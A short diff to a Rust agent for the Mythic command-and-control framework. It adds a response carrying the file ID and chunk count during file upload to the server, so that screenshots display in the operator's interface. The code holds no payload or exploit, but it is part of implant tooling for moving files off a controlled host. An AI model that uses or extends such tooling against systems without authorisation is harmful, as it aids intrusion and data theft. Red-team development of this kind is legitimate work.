@@ -136,6 +136,19 @@ async fn handle_send_file_to_mythic(msg: &mut SendFileToMythicStruct) {
     };
     utils::print_debug(&format!("Got file_id: {}, sending {} chunks", file_id, total_chunks));
 
+    // Send a user_output response with the file_id so browser scripts can render it
+    // (matches Poseidon behavior - screencapture_new.js parses this to display screenshots)
+    let file_id_response = Response {
+        task_id: msg.task_id.clone(),
+        status: format!("Downloading 1/{} Chunks...", total_chunks),
+        user_output: format!(
+            "{{\"file_id\": \"{}\", \"total_chunks\": \"{}\"}}\n",
+            file_id, total_chunks
+        ),
+        ..Response::default()
+    };
+    let _ = msg.send_responses.send(file_id_response).await;
+
     // Send each data chunk
     let mut chunk_num = 1;
     while chunk_num <= total_chunks {
